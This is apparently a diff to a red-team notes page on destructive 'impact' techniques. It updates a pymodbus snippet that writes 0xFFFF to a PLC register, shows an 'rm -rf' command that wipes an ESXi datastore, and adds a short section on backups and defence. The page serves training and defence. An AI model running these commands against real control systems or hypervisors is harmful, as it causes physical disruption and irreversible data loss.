@@ -119,7 +119,7 @@ from pymodbus.client import ModbusTcpClient
 client = ModbusTcpClient('PLC_IP', port=502)
 client.connect()
 # write registers: exact register addresses depend on the target PLC configuration
-client.write_registers(address=100, values=[0xFFFF], unit=1)
+client.write_registers(address=100, values=[0xFFFF], slave=1)  # 'slave' on pymodbus 3.x; older 2.x used 'unit'
 client.close()
 ```
 
@@ -154,3 +154,7 @@ done
 # or destroy the datastore itself
 rm -rf /vmfs/volumes/datastore/
 ```
+
+## Counter moves
+
+Destruction is loud and fast, so prevention has usually already lost by the time it fires. Tested, offline backups and a rehearsed restore path decide how much comes back. The defender's view is in the blue notes on [limiting the blast radius](https://blue.tymyrddin.dev/docs/counter/impact/).
